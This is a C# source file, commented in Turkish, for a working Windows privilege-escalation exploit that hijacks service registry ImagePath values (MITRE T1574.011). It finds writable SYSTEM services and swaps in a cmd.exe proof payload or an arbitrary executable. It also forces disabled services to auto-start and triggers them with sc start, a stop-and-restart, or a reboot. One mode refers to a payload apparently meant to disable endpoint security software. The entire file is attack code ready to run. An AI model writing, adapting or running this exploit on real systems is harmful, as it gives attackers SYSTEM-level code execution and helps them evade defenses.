using System;
using System.Diagnostics;
using System.IO;
using System.Threading;
using Microsoft.Win32;

// RegistryHijackExploit v8 — T1574.011 Service Registry ImagePath Hijack
// v8: /payload destegi — custom ServiceBase exe (SEPDisablePayload vb.)
// v7: SYSTEM erisim kaniti — System32'ye dosya yazarak SYSTEM code execution ispati
//     Child process olusturulamiyordu, simdi cmd.exe built-in veya custom payload
// MITRE ATT&CK: T1574.011, T1543.003
//
// Usage:
//   RegistryHijackExploit.exe                         -> cmd.exe proof mode (default)
//   RegistryHijackExploit.exe /payload SEPDisable.exe -> custom payload mode

class RegistryHijackExploit
{
    static string logFile = @"C:\Windows\Temp\registry_hijack_log.txt";

    static void Log(string msg)
    {
        string line = "[" + DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss") + "] " + msg;
        Console.WriteLine(line);
        try { File.AppendAllText(logFile, line + Environment.NewLine); } catch { }
    }

    static string RunCmd(string exe, string arguments)
    {
        try
        {
            ProcessStartInfo psi = new ProcessStartInfo
            {
                FileName = exe,
                Arguments = arguments,
                UseShellExecute = false,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                CreateNoWindow = true
            };
            using (Process p = Process.Start(psi))
            {
                string output = p.StandardOutput.ReadToEnd();
                p.WaitForExit();
                return output;
            }
        }
        catch { return ""; }
    }

    static string TypeToString(int t)
    {
        switch (t)
        {
            case 1:    return "KernelDriver";
            case 2:    return "FileSystemDriver";
            case 4:    return "Adapter";
            case 0x10: return "Win32OwnProcess";
            case 0x20: return "Win32ShareProcess";
            case 0x110: return "InteractiveOwnProcess";
            default:   return "0x" + t.ToString("X");
        }
    }

    static void Main(string[] args)
    {
        // ── /payload arguman parsing ──
        string customPayload = null;
        bool isCustomPayload = false;
        for (int i = 0; i < args.Length; i++)
        {
            string a = args[i].ToLower();
            if ((a == "/payload" || a == "-payload" || a == "--payload") && i + 1 < args.Length)
            {
                customPayload = args[i + 1];
                isCustomPayload = true;
                i++;
            }
        }

        Console.WriteLine("============================================================");
        Console.WriteLine("  T1574.011 — Service Registry ImagePath Hijack (v8)");
        if (isCustomPayload)
            Console.WriteLine("  PAYLOAD MODE — Custom exe: " + customPayload);
        else
            Console.WriteLine("  PROOF MODE — System32'ye dosya yazar");
        Console.WriteLine("============================================================");
        Console.WriteLine("Log: " + logFile);
        Console.WriteLine();

        // Payload path dogrulama
        string finalPayloadPath;
        if (isCustomPayload)
        {
            // Tam yol yoksa mevcut dizinden al
            if (!Path.IsPathRooted(customPayload))
                customPayload = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, customPayload);

            if (!File.Exists(customPayload))
            {
                Console.WriteLine("[!] HATA: Payload dosyasi bulunamadi: " + customPayload);
                Console.WriteLine("[!] Tam yolu girin veya ayni dizine kopyalayin");
                Console.ReadKey();
                return;
            }

            // Tam yola cevir
            finalPayloadPath = Path.GetFullPath(customPayload);
            Log("Payload MODE: Custom exe");
            Log("Payload path: " + finalPayloadPath);
            Log("Payload size: " + new FileInfo(finalPayloadPath).Length + " bytes");
        }
        else
        {
            finalPayloadPath = null; // cmd.exe modu
        }

        // cmd.exe proof payload (default mod)
        string proofFile = @"C:\Windows\System32\PRIVESC_PROOF_T1574011.txt";
        string cmdPayload =
            @"C:\Windows\System32\cmd.exe /c " +
            @"echo === T1574.011 SYSTEM CODE EXECUTION PROOF === > " + proofFile +
            @" & echo Date: %DATE% %TIME% >> " + proofFile +
            @" & echo Computer: %COMPUTERNAME% >> " + proofFile +
            @" & echo User: %USERNAME% >> " + proofFile +
            @" & echo Domain: %USERDOMAIN% >> " + proofFile +
            @" & echo Technique: Service Registry ImagePath Hijack >> " + proofFile +
            @" & echo MITRE: T1574.011 T1543.003 >> " + proofFile +
            @" & echo Impact: Arbitrary code execution as NT AUTHORITY\SYSTEM >> " + proofFile +
            @" & echo This file was written to System32 by a hijacked service >> " + proofFile +
            @" & echo Only SYSTEM or Administrators can write here >> " + proofFile +
            @" & echo === PROOF COMPLETE === >> " + proofFile +
            @" & echo DONE > C:\Windows\Temp\privesc_result.txt";

        // ImagePath olarak yazilacak deger
        string payloadImagePath = isCustomPayload ? finalPayloadPath : cmdPayload;

        if (isCustomPayload)
        {
            Log("Payload: CUSTOM EXE MODE");
            Log("ImagePath olarak yazilacak: " + payloadImagePath);
        }
        else
        {
            Log("Payload: SYSTEM kanit modu (cmd.exe)");
            Log("Kanit dosyasi: " + proofFile);
            Log("ImagePath olarak yazilacak: " + payloadImagePath);
        }

        // HIZLI TARAMA — sadece registry, sc.exe cagirmadan
        // Sadece Win32 servisleri (Type 0x10, 0x20) — kernel driver'lar dahil degil
        Console.WriteLine("Registry taramasi yapiliyor (hizli)...\n");
        string basePath = @"SYSTEM\CurrentControlSet\Services";

        string[] names = new string[500];
        string[] imgs  = new string[500];
        int[] starts   = new int[500];
        int[] types    = new int[500];
        int count = 0;
        int autoCount = 0;

        try
        {
            using (RegistryKey svcsKey = Registry.LocalMachine.OpenSubKey(basePath))
            {
                if (svcsKey == null) { Log("Services key acilamadi"); Console.ReadKey(); return; }

                foreach (string svcName in svcsKey.GetSubKeyNames())
                {
                    if (count >= 500) break;
                    try
                    {
                        using (RegistryKey svcKey = svcsKey.OpenSubKey(svcName, true))
                        {
                            if (svcKey == null) continue;
                            object imgPath = svcKey.GetValue("ImagePath");
                            if (imgPath == null) continue;

                            // ServiceType kontrolu — sadece Win32 servisler (0x10, 0x20, 0x110)
                            object typeObj = svcKey.GetValue("Type");
                            int svcType = typeObj != null ? Convert.ToInt32(typeObj) : -1;
                            if (svcType != 0x10 && svcType != 0x20 && svcType != 0x110)
                                continue;

                            object objName = svcKey.GetValue("ObjectName");
                            string account = (objName ?? "").ToString();
                            bool isSystem = account.IndexOf("LocalSystem", StringComparison.OrdinalIgnoreCase) >= 0 ||
                                            account.IndexOf("SYSTEM", StringComparison.OrdinalIgnoreCase) >= 0 ||
                                            string.IsNullOrEmpty(account);
                            if (!isSystem) continue;

                            // Gercek SetValue testi
                            string origVal = imgPath.ToString();
                            try { svcKey.SetValue("ImagePath", origVal); }
                            catch { continue; }

                            object startObj = svcKey.GetValue("Start");
                            int startType = startObj != null ? Convert.ToInt32(startObj) : -1;

                            names[count] = svcName;
                            imgs[count]  = origVal;
                            starts[count] = startType;
                            types[count] = svcType;
                            if (startType == 2) autoCount++;
                            count++;
                        }
                    }
                    catch { }
                }
            }
        }
        catch (Exception ex)
        {
            Log("Registry tarama hatasi: " + ex.Message);
        }

        if (count == 0)
        {
            Log("Yazilabilir SYSTEM Win32 servisi bulunamadi.");
            Console.ReadKey();
            return;
        }

        Log("Toplam " + count + " yazilabilir SYSTEM Win32 servisi (" + autoCount + " Auto-start)");

        // Auto-start servisleri listele
        Console.WriteLine("\n=== AUTO-START SERVISLER (reboot ile tetiklenir) ===");
        int shown = 0;
        for (int i = 0; i < count; i++)
        {
            if (starts[i] == 2)
            {
                shown++;
                Console.WriteLine("  [" + (i + 1) + "] " + names[i] + " | " + TypeToString(types[i]) + " | " + imgs[i]);
            }
        }
        if (shown == 0) Console.WriteLine("  (yok)");

        // Manual servisler
        Console.WriteLine("\n=== MANUAL SERVISLER ===");
        int manCount = 0;
        for (int i = 0; i < count; i++)
        {
            if (starts[i] == 3)
            {
                manCount++;
                if (manCount <= 15)
                    Console.WriteLine("  [" + (i + 1) + "] " + names[i] + " | " + TypeToString(types[i]) + " | " + imgs[i]);
            }
        }
        if (manCount > 15) Console.WriteLine("  ... (+" + (manCount - 15) + " daha)");
        if (manCount == 0) Console.WriteLine("  (yok)");

        // Disabled servisler
        Console.WriteLine("\n=== DISABLED SERVISLER ===");
        int disCount = 0;
        for (int i = 0; i < count; i++)
        {
            if (starts[i] == 4)
            {
                disCount++;
                if (disCount <= 10)
                    Console.WriteLine("  [" + (i + 1) + "] " + names[i] + " | " + TypeToString(types[i]) + " | " + imgs[i]);
            }
        }
        if (disCount > 10) Console.WriteLine("  ... (+" + (disCount - 10) + " daha)");
        if (disCount == 0) Console.WriteLine("  (yok)");

        // Secim
        Console.WriteLine("\n------------------------------------------------------------");
        Console.WriteLine("Servis numarasi girin (1-" + count + ") | 0=cikis");
        Console.Write("> ");
        string input = Console.ReadLine();
        int choice;
        if (!int.TryParse(input, out choice) || choice < 1 || choice > count)
        {
            Log("Cikis.");
            return;
        }

        int idx_ = choice - 1;
        string targetSvc      = names[idx_];
        string origImagePath  = imgs[idx_];
        int origStart         = starts[idx_];
        int origType          = types[idx_];

        Log("Hedef: " + targetSvc);
        Log("Orijinal ImagePath: " + origImagePath);
        Log("Orijinal Start: " + origStart);
        Log("Orijinal Type: " + TypeToString(origType) + " (" + origType + ")");

        // SCM analizi (sadece secilen servis icin)
        Console.WriteLine("\nServis detaylari aliniyor...");
        string state = "UNKNOWN";
        string qOut = RunCmd("sc.exe", "query " + targetSvc);
        if (qOut.IndexOf("RUNNING", StringComparison.OrdinalIgnoreCase) >= 0) state = "RUNNING";
        else if (qOut.IndexOf("STOPPED", StringComparison.OrdinalIgnoreCase) >= 0) state = "STOPPED";

        string failOut = RunCmd("sc.exe", "qfailure " + targetSvc);
        bool hasRestart = failOut.IndexOf("RESTART", StringComparison.OrdinalIgnoreCase) >= 0;

        string sddl = RunCmd("sc.exe", "sdshow " + targetSvc).Trim();
        bool canStart = false;
        string[] trustees = { "BU", "WD", "IU", "AU" };
        foreach (string trustee in trustees)
        {
            int tidx = sddl.IndexOf(trustee + ")");
            if (tidx < 0) continue;
            int aceStart = sddl.LastIndexOf("(", tidx);
            if (aceStart < 0) continue;
            string ace = sddl.Substring(aceStart, tidx - aceStart + trustee.Length + 1);
            if (ace.Contains("GA") || ace.Contains("RP") || ace.Contains("GX"))
            { canStart = true; break; }
        }

        Console.WriteLine("  State: " + state);
        Console.WriteLine("  Type:  " + TypeToString(origType));
        Console.WriteLine("  SCM Start izni: " + (canStart ? "EVET" : "HAYIR"));
        Console.WriteLine("  Failure restart: " + (hasRestart ? "EVET" : "HAYIR"));

        // Strateji
        string strategy;
        if (canStart && state == "STOPPED")
            strategy = "A: sc start ile hemen calistir";
        else if (hasRestart && state == "RUNNING")
            strategy = "C: sc stop -> failure restart tetikle";
        else if (origStart == 2 || origStart == 4)
            strategy = "B: ImagePath degistir, reboot bekle";
        else
            strategy = "B: ImagePath degistir, reboot/manual start bekle";

        Console.WriteLine("  Strateji: " + strategy);

        // Payload bilgisi
        if (isCustomPayload)
        {
            Console.WriteLine("\n  [*] YONTEM: Custom ServiceBase exe (P/Invoke, child process yok)");
            Console.WriteLine("  [*] Payload: " + finalPayloadPath);
            Console.WriteLine("  [*] Type gecici olarak Win32OwnProcess (0x10) yapilacak");
        }
        else
        {
            Console.WriteLine("\n  [*] YONTEM: cmd.exe /c echo ... (proof mode)");
            Console.WriteLine("  [*] SCM 30sn sonra servis 'failed' der ama komut <1sn surer");
            Console.WriteLine("  [*] Type gecici olarak Win32OwnProcess (0x10) yapilacak");
        }

        Console.WriteLine("\nDevam? (E/H): ");
        string confirm = Console.ReadLine();
        if (confirm == null || confirm.Trim().ToUpper() != "E")
        {
            Log("Iptal edildi.");
            return;
        }

        // Registry degisiklikleri
        string svcRegPath = basePath + @"\" + targetSvc;
        try
        {
            using (RegistryKey svcKey = Registry.LocalMachine.OpenSubKey(svcRegPath, true))
            {
                if (svcKey == null) { Log("HATA: Key acilamadi"); Console.ReadKey(); return; }

                // ImagePath -> payload (custom exe veya cmd.exe)
                RegistryValueKind imgKind = isCustomPayload ? RegistryValueKind.ExpandString : RegistryValueKind.ExpandString;
                svcKey.SetValue("ImagePath", payloadImagePath, imgKind);
                Log("ImagePath degistirildi -> " + payloadImagePath);

                // Type -> Win32OwnProcess (0x10) — cmd.exe icin gerekli
                if (origType != 0x10)
                {
                    svcKey.SetValue("Type", 0x10, RegistryValueKind.DWord);
                    Log("Type degistirildi: " + TypeToString(origType) + " -> Win32OwnProcess (0x10)");
                }

                // Disabled ise Auto-start yap
                if (origStart == 4)
                {
                    svcKey.SetValue("Start", 2, RegistryValueKind.DWord);
                    Log("Start: Disabled -> Auto (2)");
                }
            }

            // Dogrulama — registry'den geri oku
            using (RegistryKey svcKey = Registry.LocalMachine.OpenSubKey(svcRegPath))
            {
                if (svcKey != null)
                {
                    string verifyImg = (svcKey.GetValue("ImagePath") ?? "").ToString();
                    int verifyType = Convert.ToInt32(svcKey.GetValue("Type") ?? -1);
                    int verifyStart = Convert.ToInt32(svcKey.GetValue("Start") ?? -1);
                    Log("DOGRULAMA — ImagePath: " + verifyImg);
                    Log("DOGRULAMA — Type: " + TypeToString(verifyType) + " (" + verifyType + ")");
                    Log("DOGRULAMA — Start: " + verifyStart);

                    bool imgOk;
                    if (isCustomPayload)
                        imgOk = verifyImg.Equals(finalPayloadPath, StringComparison.OrdinalIgnoreCase);
                    else
                        imgOk = verifyImg.IndexOf("cmd.exe", StringComparison.OrdinalIgnoreCase) >= 0;
                    bool typeOk = (verifyType == 0x10);

                    if (!imgOk)
                    {
                        Log("!!! KRITIK: ImagePath dogrulamasi BASARISIZ!");
                        Log("!!! Yazilan: " + payloadImagePath);
                        Log("!!! Okunan: " + verifyImg);
                        Log("!!! UAC Registry Virtualization olabilir — exploit calismayacak");
                        Console.WriteLine("\n[!!!] REGISTRY YAZMA BASARISIZ — UAC Virtualization");
                        Console.WriteLine("[!!!] Gercek key degil, sanal (VirtualStore) key'e yaziliyor");
                        Console.ReadKey();
                        // Restore gerekmiyor cunku gercekte degismedi
                        return;
                    }

                    if (imgOk && typeOk)
                        Log("DOGRULAMA BASARILI — tum degerler dogru");
                }
            }
        }
        catch (Exception ex)
        {
            Log("HATA: Registry yazma basarisiz: " + ex.Message);
            Console.ReadKey();
            return;
        }

        // Tetikleme
        bool started = false;

        if (canStart && state == "STOPPED")
        {
            Log("Yontem A: sc start...");
            string output = RunCmd("sc.exe", "start " + targetSvc);
            Log("sc start: " + output.Trim());
            started = output.IndexOf("START_PENDING", StringComparison.OrdinalIgnoreCase) >= 0 ||
                      output.IndexOf("RUNNING", StringComparison.OrdinalIgnoreCase) >= 0;

            if (!started)
            {
                // sc start hata verdiyse, error code'u logla
                Log("sc start basarisiz — tam cikti: " + output);
            }
        }

        if (!started && hasRestart && state == "RUNNING")
        {
            Log("Yontem C: sc stop -> failure restart...");
            string stopOut = RunCmd("sc.exe", "stop " + targetSvc);
            Log("sc stop: " + stopOut.Trim());
            if (stopOut.IndexOf("STOP_PENDING", StringComparison.OrdinalIgnoreCase) >= 0 ||
                stopOut.IndexOf("STOPPED", StringComparison.OrdinalIgnoreCase) >= 0)
            {
                Log("Failure restart bekleniyor (15s)...");
                Thread.Sleep(15000);
                started = true;
            }
        }

        if (!started)
        {
            Log("Yontem B: Reboot gerekiyor.");
            Console.WriteLine("\n[!] Registry degisiklikleri tamamlandi.");
            Console.WriteLine("[!] Reboot ile tetiklenecek: shutdown /r /t 0 /f");
        }

        // Sonuc kontrol
        if (started)
        {
            Log("5 saniye bekleniyor...");
            Thread.Sleep(5000);
        }

        // Kanit dosyasi kontrolu
        if (isCustomPayload)
        {
            // Custom payload modunda — payload'in kendi log dosyasini kontrol et
            string sepProof = @"C:\Windows\Temp\sep_disable_proof.txt";
            string privescResult = @"C:\Windows\Temp\privesc_result.txt";
            bool found = false;

            if (File.Exists(sepProof))
            {
                string proof = File.ReadAllText(sepProof);
                Log("=== CUSTOM PAYLOAD KANITI BULUNDU ===");
                Log("Dosya: " + sepProof);
                Log("Icerik:\n" + proof.Trim());
                Console.WriteLine("\n[!!!] BASARILI — Payload log dosyasi bulundu!");
                Console.WriteLine("[!!!] " + sepProof);
                found = true;
            }
            if (File.Exists(privescResult))
            {
                string result = File.ReadAllText(privescResult);
                Log("privesc_result: " + result.Trim());
                found = true;
            }
            if (!found)
                Log("Payload log dosyasi henuz olusturulmadi — reboot bekleniyor olabilir");

            Console.WriteLine("\n============================================================");
            Console.WriteLine("  REBOOT SONRASI KONTROL:");
            Console.WriteLine("    type " + sepProof);
            Console.WriteLine("    type " + privescResult);
            Console.WriteLine("============================================================");
        }
        else
        {
            // Proof mode — System32'ye yazilan kanit dosyasi
            string proofPath = @"C:\Windows\System32\PRIVESC_PROOF_T1574011.txt";
            if (File.Exists(proofPath))
            {
                string proof = File.ReadAllText(proofPath);
                Log("=== SYSTEM KANITI BULUNDU ===");
                Log("Dosya: " + proofPath);
                Log("Icerik:\n" + proof.Trim());
                Console.WriteLine("\n[!!!] BASARILI — System32'de kanit dosyasi olusturuldu!");
                Console.WriteLine("[!!!] " + proofPath);
            }
            else
            {
                string resultFile = @"C:\Windows\Temp\privesc_result.txt";
                if (File.Exists(resultFile))
                {
                    string result = File.ReadAllText(resultFile);
                    Log("privesc_result: " + result.Trim());
                }
                Log("Kanit dosyasi henuz olusturulmadi — reboot bekleniyor olabilir");
            }

            Console.WriteLine("\n============================================================");
            Console.WriteLine("  REBOOT SONRASI KONTROL:");
            Console.WriteLine("    type C:\\Windows\\System32\\PRIVESC_PROOF_T1574011.txt");
            Console.WriteLine("    type C:\\Windows\\Temp\\privesc_result.txt");
            Console.WriteLine("============================================================");
        }

        // Restore
        Console.WriteLine("\n  R = Simdi restore et");
        Console.WriteLine("  W = Ertele (reboot sonrasi bu exe'yi tekrar calistir, R sec)");
        Console.Write("> ");
        string rc = Console.ReadLine();

        if (rc != null && rc.Trim().ToUpper() == "W")
        {
            string restoreFile = @"C:\Windows\Temp\svc_restore_info.txt";
            File.WriteAllText(restoreFile,
                targetSvc + "|" + origImagePath + "|" + origStart + "|" + origType + Environment.NewLine);
            Log("Restore ertelendi. Bilgi: " + restoreFile);
            Log("Manuel restore komutlari:");
            Log("  reg add \"HKLM\\" + svcRegPath + "\" /v ImagePath /t REG_EXPAND_SZ /d \"" + origImagePath + "\" /f");
            Log("  reg add \"HKLM\\" + svcRegPath + "\" /v Type /t REG_DWORD /d " + origType + " /f");
            if (origStart == 4)
                Log("  reg add \"HKLM\\" + svcRegPath + "\" /v Start /t REG_DWORD /d 4 /f");
        }
        else
        {
            DoRestore(svcRegPath, origImagePath, origStart, origType);
        }

        Console.WriteLine("\nBitti. Log: " + logFile);
        Console.ReadKey();
    }

    static void DoRestore(string svcRegPath, string origImagePath, int origStart, int origType)
    {
        try
        {
            using (RegistryKey svcKey = Registry.LocalMachine.OpenSubKey(svcRegPath, true))
            {
                if (svcKey != null)
                {
                    svcKey.SetValue("ImagePath", origImagePath);
                    Log("ImagePath geri yuklendi: " + origImagePath);

                    svcKey.SetValue("Type", origType, RegistryValueKind.DWord);
                    Log("Type geri yuklendi: " + TypeToString(origType));

                    if (origStart == 4)
                    {
                        svcKey.SetValue("Start", 4, RegistryValueKind.DWord);
                        Log("Start geri yuklendi: Disabled");
                    }
                }
            }
            Log("Restore tamamlandi.");
        }
        catch (Exception ex)
        {
            Log("Restore hatasi: " + ex.Message);
        }
    }
}
